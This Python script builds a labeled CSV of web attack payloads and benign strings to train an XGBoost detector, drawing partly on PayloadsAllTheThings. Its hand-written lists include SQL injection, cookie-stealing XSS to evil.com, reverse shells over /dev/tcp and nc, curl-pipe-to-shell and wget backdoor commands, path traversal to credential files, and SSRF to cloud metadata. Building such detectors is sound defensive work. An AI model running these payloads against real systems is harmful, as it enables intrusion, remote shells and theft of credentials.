"""
Data Preparation Script for XGBoost Training
Scrapes PayloadsAllTheThings repository and creates training dataset
"""

import os
import re
import csv
import requests
from typing import List, Dict, Tuple
from pathlib import Path


class PayloadDataCollector:
    """
    Collects attack payloads from PayloadsAllTheThings GitHub repository
    and creates a labeled CSV for XGBoost training.
    """
    
    def __init__(self):
        self.base_url = "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master"
        self.payloads: List[Dict[str, str]] = []
        
    def fetch_github_file(self, path: str) -> str:
        """Fetch raw file content from GitHub"""
        url = f"{self.base_url}/{path}"
        try:
            response = requests.get(url, timeout=10)
            response.raise_for_status()
            return response.text
        except Exception as e:
            print(f"[WARN] Failed to fetch {path}: {e}")
            return ""
    
    def extract_payloads_from_markdown(self, content: str, label: str) -> List[str]:
        """Extract payloads from markdown code blocks and inline code"""
        payloads = []
        
        # Extract from code blocks (```...```)
        code_blocks = re.findall(r'```(?:sql|bash|javascript|html|xml)?\n(.*?)\n```', content, re.DOTALL)
        for block in code_blocks:
            lines = block.strip().split('\n')
            for line in lines:
                line = line.strip()
                if line and not line.startswith('#') and not line.startswith('//'):
                    payloads.append(line)
        
        # Extract from inline code (`...`)
        inline_code = re.findall(r'`([^`]+)`', content)
        for code in inline_code:
            if len(code) > 5 and any(c in code for c in ["'", '"', '<', '>', ';', '|', '--']):
                payloads.append(code)
        
        return payloads
    
    def collect_sql_injection_payloads(self):
        """Collect SQL injection payloads"""
        print("[*] Collecting SQL Injection payloads...")
        
        # Main SQLi file
        paths = [
            "SQL%20Injection/README.md",
            "SQL%20Injection/MySQL%20Injection.md",
            "SQL%20Injection/PostgreSQL%20Injection.md",
            "SQL%20Injection/MSSQL%20Injection.md",
        ]
        
        for path in paths:
            content = self.fetch_github_file(path)
            if content:
                extracted = self.extract_payloads_from_markdown(content, "sql_injection")
                for payload in extracted:
                    self.payloads.append({"payload": payload, "label": "sql_injection"})
        
        # Add manual SQLi patterns
        manual_sqli = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "1' AND 1=1--",
            "' AND 1=0 UNION ALL SELECT NULL--",
            "' WAITFOR DELAY '00:00:05'--",
            "'; DROP TABLE users--",
            "' OR 'x'='x",
            "1'; exec master..xp_cmdshell 'ping 10.0.0.1'--",
            "' UNION SELECT password FROM users--",
            "admin'/**/OR/**/'1'='1",
            "1' ORDER BY 1--",
            "1' GROUP BY 1--",
            "' OR '1'='1' /*",
        ]
        for payload in manual_sqli:
            self.payloads.append({"payload": payload, "label": "sql_injection"})
        
        print(f"    Collected {len([p for p in self.payloads if p['label'] == 'sql_injection'])} SQLi payloads")
    
    def collect_xss_payloads(self):
        """Collect XSS payloads"""
        print("[*] Collecting XSS payloads...")
        
        paths = [
            "XSS%20Injection/README.md",
            "XSS%20Injection/XSS%20in%20Angular.md",
        ]
        
        for path in paths:
            content = self.fetch_github_file(path)
            if content:
                extracted = self.extract_payloads_from_markdown(content, "xss")
                for payload in extracted:
                    self.payloads.append({"payload": payload, "label": "xss"})
        
        # Add manual XSS patterns
        manual_xss = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>fetch('http://evil.com?c='+document.cookie)</script>",
            "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
        ]
        for payload in manual_xss:
            self.payloads.append({"payload": payload, "label": "xss"})
        
        print(f"    Collected {len([p for p in self.payloads if p['label'] == 'xss'])} XSS payloads")
    
    def collect_command_injection_payloads(self):
        """Collect command injection payloads"""
        print("[*] Collecting Command Injection payloads...")
        
        paths = [
            "Command%20Injection/README.md",
        ]
        
        for path in paths:
            content = self.fetch_github_file(path)
            if content:
                extracted = self.extract_payloads_from_markdown(content, "command_injection")
                for payload in extracted:
                    self.payloads.append({"payload": payload, "label": "command_injection"})
        
        # Add manual command injection patterns
        manual_cmdi = [
            "; ls",
            "| cat /etc/passwd",
            "&& whoami",
            "|| ping -c 10 127.0.0.1",
            "; curl http://evil.com/shell.sh | sh",
            "`whoami`",
            "$(whoami)",
            "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            "| nc -e /bin/sh 10.0.0.1 4444",
            "&& wget http://evil.com/backdoor -O /tmp/backdoor && chmod +x /tmp/backdoor && /tmp/backdoor",
            "; python -c 'import socket,subprocess,os;...'",
            "| perl -e 'use Socket;...'",
        ]
        for payload in manual_cmdi:
            self.payloads.append({"payload": payload, "label": "command_injection"})
        
        print(f"    Collected {len([p for p in self.payloads if p['label'] == 'command_injection'])} CMDI payloads")
    
    def collect_path_traversal_payloads(self):
        """Collect path traversal payloads"""
        print("[*] Collecting Path Traversal payloads...")
        
        paths = [
            "Directory%20Traversal/README.md",
        ]
        
        for path in paths:
            content = self.fetch_github_file(path)
            if content:
                extracted = self.extract_payloads_from_markdown(content, "path_traversal")
                for payload in extracted:
                    self.payloads.append({"payload": payload, "label": "path_traversal"})
        
        # Add manual path traversal patterns
        manual_traversal = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "../../../../../../../../../../etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
        ]
        for payload in manual_traversal:
            self.payloads.append({"payload": payload, "label": "path_traversal"})
        
        print(f"    Collected {len([p for p in self.payloads if p['label'] == 'path_traversal'])} traversal payloads")
    
    def collect_ssrf_payloads(self):
        """Collect SSRF payloads"""
        print("[*] Collecting SSRF payloads...")
        
        paths = [
            "Server%20Side%20Request%20Forgery/README.md",
        ]
        
        for path in paths:
            content = self.fetch_github_file(path)
            if content:
                extracted = self.extract_payloads_from_markdown(content, "ssrf")
                for payload in extracted:
                    self.payloads.append({"payload": payload, "label": "ssrf"})
        
        # Add manual SSRF patterns
        manual_ssrf = [
            "http://localhost",
            "http://127.0.0.1",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://192.168.1.1",
            "http://10.0.0.1",
            "http://[::1]",
            "http://2130706433",  # 127.0.0.1 in decimal
            "http://0177.0.0.1",  # 127.0.0.1 in octal
        ]
        for payload in manual_ssrf:
            self.payloads.append({"payload": payload, "label": "ssrf"})
        
        print(f"    Collected {len([p for p in self.payloads if p['label'] == 'ssrf'])} SSRF payloads")
    
    def generate_benign_samples(self, count: int = 1000):
        """Generate benign (non-attack) samples for training"""
        print(f"[*] Generating {count} benign samples...")
        
        benign_patterns = [
            "user@example.com",
            "john.doe@company.com",
            "test123",
            "MyPassword123!",
            "Hello World",
            "This is a normal comment",
            "Please help me with this issue",
            "Thank you for your assistance",
            "I would like to order a product",
            "Can you provide more information?",
            "Meeting scheduled for tomorrow",
            "Project deadline is next week",
            "Invoice #12345",
            "Order confirmation",
            "Customer feedback",
            "Support ticket #98765",
            "Product review: Great quality!",
            "Shipping address: 123 Main St",
            "Phone: +1-555-1234",
            "Total amount: $99.99",
        ]
        
        import random
        for i in range(count):
            sample = random.choice(benign_patterns)
            # Add some variation
            if random.random() < 0.3:
                sample = sample + f" {random.randint(1, 1000)}"
            self.payloads.append({"payload": sample, "label": "benign"})
        
        print(f"    Generated {count} benign samples")
    
    def save_to_csv(self, output_path: str):
        """Save collected payloads to CSV file"""
        print(f"[*] Saving payloads to {output_path}...")
        
        # Ensure output directory exists
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        
        # Remove duplicates
        unique_payloads = []
        seen = set()
        for item in self.payloads:
            key = (item['payload'], item['label'])
            if key not in seen:
                seen.add(key)
                unique_payloads.append(item)
        
        # Write to CSV
        with open(output_path, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=['payload', 'label'])
            writer.writeheader()
            writer.writerows(unique_payloads)
        
        # Print statistics
        print(f"\n[✓] Dataset created: {output_path}")
        print(f"    Total samples: {len(unique_payloads)}")
        
        # Count by label
        from collections import Counter
        label_counts = Counter(item['label'] for item in unique_payloads)
        for label, count in sorted(label_counts.items()):
            print(f"    - {label}: {count}")
        print()
    
    def collect_all(self, output_path: str = "backend/datasets/web_payloads.csv"):
        """Collect all attack types and save to CSV"""
        print("="*60)
        print("PayloadsAllTheThings Data Collection")
        print("="*60)
        print()
        
        self.collect_sql_injection_payloads()
        self.collect_xss_payloads()
        self.collect_command_injection_payloads()
        self.collect_path_traversal_payloads()
        self.collect_ssrf_payloads()
        self.generate_benign_samples(count=500)
        
        self.save_to_csv(output_path)
        
        return output_path


def main():
    """Main execution"""
    collector = PayloadDataCollector()
    csv_path = collector.collect_all()
    
    print("="*60)
    print("Next Steps:")
    print("="*60)
    print("1. Review the generated CSV:")
    print(f"   cat {csv_path}")
    print()
    print("2. Train the XGBoost model:")
    print("   python -m ml.web_payload_trainer")
    print()
    print("3. Model files will be saved to backend/models/:")
    print("   - web_attack_model.json")
    print("   - web_vectorizer.pkl")
    print("   - web_label_encoder.pkl")
    print("="*60)


if __name__ == "__main__":
    main()
